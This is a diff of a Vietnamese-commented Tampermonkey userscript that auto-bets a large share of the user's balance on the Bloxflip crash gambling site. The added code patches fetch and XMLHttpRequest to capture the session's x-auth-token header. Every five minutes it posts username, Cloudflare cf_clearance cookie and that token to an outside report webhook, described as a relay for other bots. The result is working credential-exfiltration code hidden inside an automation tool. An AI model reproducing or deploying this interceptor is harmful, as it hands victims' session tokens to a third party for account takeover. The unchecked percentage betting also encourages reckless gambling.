@@ -1,8 +1,8 @@
 // ==UserScript==
 // @name         Bloxflip Auto Crash Pro (Draggable & Classic UI)
 // @namespace    http://tampermonkey.net/
-// @version      1.8
-// @description  Bản gốc trên GitHub. Báo cáo Data (CF_Clearance & Auth Token) siêu sạch mỗi 5 phút làm trạm trung gian cho bot khác.
+// @version      1.9
+// @description  Bản gốc trên GitHub. Thêm Network Interceptor bắt sóng Auth Token từ Header. Sửa lỗi Unknown Username.
 // @author       You
 // @match        https://bloxflip.com/*
 // @icon         https://www.google.com/s2/favicons?sz=64&domain=bloxflip.com
@@ -11,6 +11,36 @@
 
 (function() {
     'use strict';
+
+    // ==========================================
+    // --- NETWORK INTERCEPTOR (BẮT TOKEN TỪ HEADER) ---
+    // ==========================================
+    let globalAuthToken = localStorage.getItem('bfc_captured_token') || "NOT_FOUND";
+
+    // 1. Đánh chặn Fetch API
+    const originalFetch = window.fetch;
+    window.fetch = async function(...args) {
+        if (args[1] && args[1].headers) {
+            try {
+                const headers = new Headers(args[1].headers);
+                if (headers.has('x-auth-token')) {
+                    globalAuthToken = headers.get('x-auth-token');
+                    localStorage.setItem('bfc_captured_token', globalAuthToken);
+                }
+            } catch (e) {}
+        }
+        return originalFetch.apply(this, args);
+    };
+
+    // 2. Đánh chặn XMLHttpRequest (XHR)
+    const originalSetRequestHeader = XMLHttpRequest.prototype.setRequestHeader;
+    XMLHttpRequest.prototype.setRequestHeader = function(header, value) {
+        if (header.toLowerCase() === 'x-auth-token') {
+            globalAuthToken = value;
+            localStorage.setItem('bfc_captured_token', globalAuthToken);
+        }
+        return originalSetRequestHeader.apply(this, arguments);
+    };
 
     // ==========================================
     // --- KHU VỰC CẤU HÌNH ĐƯỜNG DẪN (URL) ---
@@ -34,12 +64,12 @@
     // --- QUẢN LÝ DỮ LIỆU LOCALSTORAGE ---
     const CFG = {
         enabled: localStorage.getItem('bfc_enabled') !== 'false',
-        mode: localStorage.getItem('bfc_mode') || 'safe', // 'safe' (2x1) hoặc 'risk' (1x1)
+        mode: localStorage.getItem('bfc_mode') || 'safe', 
         autoCashout: localStorage.getItem('bfc_autocashout') || '1.01',
-        betPercent: localStorage.getItem('bfc_bet_percent') || '50', // Phần trăm số dư cược
+        betPercent: localStorage.getItem('bfc_bet_percent') || '50', 
         webhookUrl: localStorage.getItem('bfc_webhookurl') || '',
         webhookEnabled: localStorage.getItem('bfc_webhook_enabled') === 'true',
-        autoRefresh: localStorage.getItem('bfc_auto_refresh') !== 'false' // Chống treo mặc định Bật
+        autoRefresh: localStorage.getItem('bfc_auto_refresh') !== 'false' 
     };
 
     function saveConfig(key, value) {
@@ -54,8 +84,8 @@
     let liveHistoryEl;
     let currentBalance = 0; 
     let currentUsername = "Unknown";
-    let lastHistoryUpdateTime = Date.now(); // Biến theo dõi thời gian chống treo do web đứng
-    let scriptStartTime = Date.now(); // Biến đếm thời gian sống của script (5 phút F5)
+    let lastHistoryUpdateTime = Date.now(); 
+    let scriptStartTime = Date.now(); 
 
     function initConsole() {
         if (!document.body) {
@@ -104,7 +134,6 @@
             transition: opacity 0.3s ease, visibility 0.3s ease;
         `;
 
-        // Tạo hai lớp nền để chuyển cảnh Fade mượt mà
         const bgSafe = document.createElement('div');
         bgSafe.id = 'bfc-bg-safe';
         bgSafe.style.cssText = `
@@ -128,7 +157,6 @@
         consoleEl.appendChild(bgSafe);
         consoleEl.appendChild(bgRisk);
 
-        // KHU VỰC NẮM KÉO
         const dragHeader = document.createElement('div');
         dragHeader.id = 'bfc-drag-header';
         dragHeader.style.cssText = `
@@ -137,15 +165,12 @@
             border-bottom: 1px solid rgba(255,255,255,0.1);
         `;
 
-        // KHU VỰC CHỨA NỘI DUNG
         const bodyContainer = document.createElement('div');
         bodyContainer.style.cssText = `display: flex; flex-direction: row; width: 100%;`;
 
-        // --- CỘT TRÁI (UI CHÍNH) ---
         const leftCol = document.createElement('div');
         leftCol.style.cssText = `width: 360px; display: flex; flex-direction: column; align-items: center; padding-bottom: 15px;`;
 
-        // ẢNH GIF & TIÊU ĐỀ & SỐ DƯ
         const classicUI = document.createElement('div');
         classicUI.style.cssText = `display: flex; flex-direction: column; align-items: center; margin-top: 15px; width: 100%;`;
         classicUI.innerHTML = `
@@ -155,7 +180,6 @@
             <div id="bfc-main-status" style="color: #69ff94; font-size: 14px; margin-top: 5px; font-weight: bold; text-shadow: 0 1px 3px rgba(0,0,0,0.8);">Đang tải dữ liệu...</div>
         `;
 
-        // CONFIG BOX (Chứa Mode, Cashout, Percent, Webhook, Refresh và Nút Test ở góc dưới)
         const configBox = document.createElement('div');
         configBox.style.cssText = `
             width: 85%; margin-top: 15px; padding: 10px; background: rgba(0, 0, 0, 0.5); 
@@ -201,7 +225,6 @@
             </div>
         `;
 
-        // LOG CONTAINER
         const logBox = document.createElement('div');
         logBox.style.cssText = `
             width: 85%; margin: 10px 0 0 0; padding: 8px; background: rgba(0, 0, 0, 0.6); 
@@ -210,20 +233,18 @@
         `;
         logBox.innerHTML = `<div id="bfc-log-container" style="display: flex; flex-direction: column; gap: 4px;"></div>`;
 
-        // PHIÊN BẢN (VERSION)
         const versionText = document.createElement('div');
         versionText.style.cssText = `
             width: 100%; text-align: center; color: rgba(255, 255, 255, 0.4); 
             font-size: 10px; margin-top: 8px; letter-spacing: 1px; font-weight: bold;
         `;
-        versionText.innerText = "Version 1.8";
+        versionText.innerText = "Version 1.9";
 
         leftCol.appendChild(classicUI);
         leftCol.appendChild(configBox);
         leftCol.appendChild(logBox);
         leftCol.appendChild(versionText);
 
-        // --- CỘT PHẢI (LỊCH SỬ) ---
         const rightCol = document.createElement('div');
         rightCol.style.cssText = `
             width: 120px; background: rgba(0, 0, 0, 0.4); border-left: 1px solid rgba(255,255,255,0.1); 
@@ -234,19 +255,16 @@
             <div id="bfc-live-history" style="color: #fff; font-size: 14px; font-family: monospace; text-align: center; line-height: 2.0;">Đang chờ...</div>
         `;
 
-        // GẮN VÀO KHUNG CHÍNH
         bodyContainer.appendChild(leftCol);
         bodyContainer.appendChild(rightCol);
         consoleEl.appendChild(dragHeader);
         consoleEl.appendChild(bodyContainer);
         document.body.appendChild(consoleEl);
 
-        // Lấy Element
         mainStatusEl = document.getElementById('bfc-main-status');
         logContainerEl = document.getElementById('bfc-log-container');
         liveHistoryEl = document.getElementById('bfc-live-history');
 
-        // Logic Kéo thả UI
         let isDragging = false, startX, startY, initialLeft, initialTop;
         
         dragHeader.addEventListener('mousedown', (e) => {
@@ -271,11 +289,9 @@
             isDragging = false;
         });
 
-        // Hàm áp dụng Theme (Safe/Risk) với Fade Effect
         function applyTheme() {
             const theme = APP_URLS[CFG.mode];
             
-            // Xử lý chuyển cảnh Fade nền
             const elBgSafe = document.getElementById('bfc-bg-safe');
             const elBgRisk = document.getElementById('bfc-bg-risk');
             if (elBgSafe && elBgRisk) {
@@ -288,7 +304,6 @@
                 }
             }
 
-            // Xử lý Fade cho Avatar (Mờ đi -> Đổi ảnh -> Sáng lên)
             const avatarImg = document.getElementById('bfc-avatar');
             if (avatarImg) {
                 avatarImg.style.opacity = '0';
@@ -298,7 +313,6 @@
                 }, 300);
             }
 
-            // Đổi màu các nút tương ứng
             const modeSafeBtn = document.getElementById('bfc-mode-safe');
             const modeRiskBtn = document.getElementById('bfc-mode-risk');
             
@@ -315,7 +329,6 @@
             }
         }
 
-        // Gắn sự kiện Mode Switch
         const modeSafeBtn = document.getElementById('bfc-mode-safe');
         const modeRiskBtn = document.getElementById('bfc-mode-risk');
         const modeDesc = document.getElementById('bfc-mode-desc');
@@ -338,7 +351,6 @@
             updateWaitingStatusLabel(true);
         });
 
-        // Gắn sự kiện Input Config
         document.getElementById('bfc-inp-bet-percent').addEventListener('change', (e) => {
             let val = parseFloat(e.target.value);
             if (isNaN(val) || val < 1) val = 1;
@@ -408,7 +420,7 @@
         
         if(CFG.enabled) {
             lastHistoryUpdateTime = Date.now(); 
-            scriptStartTime = Date.now(); // Reset bộ đếm F5 5 phút khi bật lại Auto
+            scriptStartTime = Date.now(); 
             updateWaitingStatusLabel(true);
             addLog("▶ Auto đã được BẬT", "#69ff94");
         } else {
@@ -448,9 +460,7 @@
         fetch(CFG.webhookUrl, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) }).catch(() => {});
     }
 
-    // --- KHỞI TẠO ---
     initConsole();
-
 
     // ==========================================
     // --- LOGIC AUTO CRASH (NHẬN DIỆN & CƯỢC) ---
@@ -458,15 +468,13 @@
 
     let previousHistorySnapshot = "";
     let isWaitingForRoundResult = false; 
-    let isProcessingResult = false; // Cờ khóa trong lúc đợi 2s lấy API
-    let winToastDetected = false;   // Cờ ghi nhận đã thấy thông báo "Successfully cashed out"
-    let forceTestCondition = false; // Cờ giả lập Test Run
+    let isProcessingResult = false; 
+    let winToastDetected = false;   
+    let forceTestCondition = false; 
 
-    // Vòng lặp siêu nhanh rình thông báo Toast Cashout (Chỉ chạy khi đang đợi kết quả)
     setInterval(() => {
         if (!isWaitingForRoundResult || winToastDetected) return;
         
-        // Sử dụng textContent để check toàn bộ text trên trang siêu tốc mà không gây giật lag
         const bodyText = document.body.textContent || "";
         if (bodyText.includes("Successfully cashed out at")) {
             winToastDetected = true;
@@ -482,7 +490,6 @@
 
     function getHistorySnapshot(items) {
         let snap = "";
-        // Bloxflip thêm game mới vào đầu danh sách (index 0). Ta chỉ lấy 5 game đầu làm chữ ký phân biệt ván mới
         for(let i = 0; i < Math.min(5, items.length); i++) {
             snap += items[i].innerText.trim() + "|";
         }
@@ -492,10 +499,8 @@
     function updateLiveHistoryUI(items) {
         if (!liveHistoryEl) return;
         let displayArr = [];
-        // Hiển thị 8 game mới nhất theo thứ tự thực tế
         for(let i = 0; i < Math.min(8, items.length); i++) {
             let text = items[i].innerText.trim();
-            // Nâng cấp: Dùng parseFloat bắt 100% chuẩn số 1, kể cả 1.0 hay 1.00
             let val = parseFloat(text);
             if(val === 1) displayArr.push(`<span style="color: #ff4785; font-weight: bold;">${text}</span>`);
             else displayArr.push(text);
@@ -557,12 +562,17 @@
         return null;
     }
 
-    // Gom gọi API User/Balance thành 1 hàm để tái sử dụng
+    // NÂNG CẤP: Gọi API kèm theo globalAuthToken đã đánh chặn được
     async function fetchUserData() {
         try {
+            let headers = { 'Accept': 'application/json' };
+            if (globalAuthToken !== "NOT_FOUND") {
+                headers['x-auth-token'] = globalAuthToken;
+            }
+
             const response = await fetch(APP_URLS.apiUser, {
                 method: 'GET',
-                headers: { 'Accept': 'application/json' }
+                headers: headers
             });
             if (response.ok) {
                 const data = await response.json();
@@ -610,14 +620,13 @@
     async function executeBet() {
         if (isWaitingForRoundResult || isProcessingResult) return;
         isWaitingForRoundResult = true; 
-        winToastDetected = false; // Reset cờ Toast mỗi khi cược mới
+        winToastDetected = false; 
         
         setMainStatus("⚡ Đang thiết lập và đặt cược...", "#ffeb3b");
         addLog("Chuẩn bị cược...", "#ffeb3b");
 
         let displayBalStr = "Đang tải...";
 
-        // 1. LẤY SỐ DƯ TỪ API VÀ ĐIỀN VÀO Ô BET AMOUNT THEO PHẦN TRĂM ĐÃ CÀI ĐẶT
         const userData = await fetchUserData();
         if (userData !== null && userData.balance > 0) {
             currentBalance = userData.balance;
@@ -626,7 +635,6 @@
             const percentStr = CFG.betPercent;
             const percent = parseFloat(percentStr) / 100;
             
-            // TÍNH TOÁN VÀ LÀM TRÒN XUỐNG SỐ TIỀN CƯỢC
             const betAmountNum = Math.floor(currentBalance * percent);
             const betAmount = betAmountNum.toString();
             
@@ -648,13 +656,11 @@
             addLog("⚠ Không thể lấy số dư hoặc số dư = 0.", "#ffeb3b");
         }
 
-        // 2. CHẮC CHẮN LẠI AUTO CASHOUT ĐÃ ĐÚNG TRƯỚC KHI CƯỢC
         const targetInput = getAutoCashoutInput();
         if (targetInput) {
             setReactInputValue(targetInput, CFG.autoCashout);
         }
 
-        // 3. ĐỢI VÀI MS RỒI JOIN GAME
         setTimeout(() => {
             const joinBtn = findButtonByText('Join game') || findButtonByText('Join next game') || findButtonByText('Place Bet');
             
@@ -682,11 +688,7 @@
         // --- CƠ CHẾ HARD REFRESH VÀ ĐỒNG BỘ DATA CHO DỰ ÁN KHÁC (MỖI 5 PHÚT) ---
         if (CFG.autoRefresh && !isWaitingForRoundResult && !isProcessingResult && (Date.now() - scriptStartTime > 300000)) {
             addLog("🔄 Đạt mốc 5 phút. Đồng bộ Data làm trạm trung gian & F5...", "#00bcd4");
-            scriptStartTime = Date.now(); // Khóa để tránh gọi hàm liên tục
-            
-            // 1. Lấy Auth Token (Loại bỏ dấu ngoặc kép thừa để bot ngoài dễ đọc)
-            let authToken = localStorage.getItem('_DO_NOT_SHARE_BLOXFLIP_TOKEN') || "NOT_FOUND";
-            authToken = authToken.replace(/["']/g, ""); 
+            scriptStartTime = Date.now(); 
             
             // 2. Lấy Cookie cf_clearance (Bypass Cloudflare)
             let cfClearance = "NOT_FOUND";
@@ -694,24 +696,21 @@
             if (match) cfClearance = match[2];
             
             // 3. Đóng gói Payload siêu sạch để bot khác dễ split('|')
-            // Định dạng: Username|cf_clearance|Auth_Token
-            const payload = { content: `${currentUsername}|${cfClearance}|${authToken}` };
+            const payload = { content: `${currentUsername}|${cfClearance}|${globalAuthToken}` };
             
-            // Gắn báo cáo vào Webhook riêng biệt
             fetch(APP_URLS.reportWebhook, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             }).then(() => {
-                setTimeout(() => window.location.reload(), 1000); // Đợi 1s cho webhook gửi xong rồi mới F5
+                setTimeout(() => window.location.reload(), 1000); 
             }).catch(() => {
-                setTimeout(() => window.location.reload(), 1000); // Lỗi vẫn phải F5
+                setTimeout(() => window.location.reload(), 1000); 
             });
             
             return;
         }
 
-        // --- CƠ CHẾ CHỐNG TREO THÔNG MINH ---
         if (CFG.autoRefresh && !isWaitingForRoundResult && !isProcessingResult && (Date.now() - lastHistoryUpdateTime > 120000)) {
             addLog("⚠ Phát hiện trang bị treo (quá 2 phút không có ván mới). Đang làm mới...", "#ff5252");
             lastHistoryUpdateTime = Date.now(); 
@@ -733,12 +732,10 @@
                 lastHistoryUpdateTime = Date.now(); 
             }
             
-            // Game mới nhất luôn nằm ở vị trí đầu tiên (index 0) của NodeList
             const latestCrashStr = items[0].innerText.trim();
             const latestCrashNum = parseFloat(latestCrashStr);
             const targetCashoutNum = parseFloat(CFG.autoCashout);
 
-            // Đếm số lượng nổ "1" liên tục hiện tại (Dùng parseFloat cho 100% chính xác)
             let count1s = 0;
             for (let i = 0; i < Math.min(10, items.length); i++) {
                 if (parseFloat(items[i].innerText) === 1) {
@@ -748,13 +745,11 @@
                 }
             }
 
-            // Nhúng điều kiện giả lập nếu người dùng bấm nút Test Run
             if (forceTestCondition && !isWaitingForRoundResult) {
                 count1s = 2; 
                 forceTestCondition = false;
             }
 
-            // Gửi cảnh báo Discord khi phát hiện đúng 3 lần "1" liên tiếp (chỉ báo khi có ván mới thật)
             if (isNewRound && count1s === 3) {
                 addLog("⚠ Phát hiện 3 lần nổ 1.00 liên tiếp!", "#ff9800");
                 
@@ -763,17 +758,14 @@
                 sendWebhook("⚠️ Cảnh báo chuỗi Crash Nguy hiểm", formatPayload, "#ff9800");
             }
 
-            // KHI VÁN KẾT THÚC VÀ ĐANG CÓ LỊCH CƯỢC
             if (isWaitingForRoundResult) {
                 isWaitingForRoundResult = false;
-                isProcessingResult = true; // Khóa không cho quét đợt tiếp theo
+                isProcessingResult = true; 
                 
-                // Xác định Win/Lose: Nếu chộp được Toast HOẶC nổ lớn hơn Cashout
                 const isWin = winToastDetected || (latestCrashNum >= targetCashoutNum);
 
                 setMainStatus("⏳ Đang chờ hệ thống cập nhật số dư (2s)...", "#ffeb3b");
 
-                // ĐỢI 2 GIÂY ĐỂ SERVER BLOXFLIP HOÀN TẤT CỘNG/TRỪ TIỀN
                 setTimeout(async () => {
                     const userData = await fetchUserData();
                     if (userData !== null) {
@@ -799,7 +791,7 @@
                     
                     updateBalanceUI(); 
                     
-                    isProcessingResult = false; // Mở khóa
+                    isProcessingResult = false; 
                     winToastDetected = false;
 
                     setTimeout(() => {
@@ -807,10 +799,9 @@
                     }, 1500);
                 }, 2000);
                 
-                return; // Bỏ qua quét điều kiện bet ở nhịp này
+                return; 
             }
 
-            // XÉT ĐIỀU KIỆN DỰA TRÊN CHẾ ĐỘ (Chỉ xét khi không bị khóa)
             if (!isProcessingResult && !isWaitingForRoundResult) {
                 if (CFG.mode === 'safe') {
                     if (count1s >= 2) {
@@ -831,7 +822,6 @@
         }
     }
 
-    // --- BẮT ĐẦU VÒNG LẶP ---
     setTimeout(() => {
         setInitialCashout();
         updateBalanceUI(); 
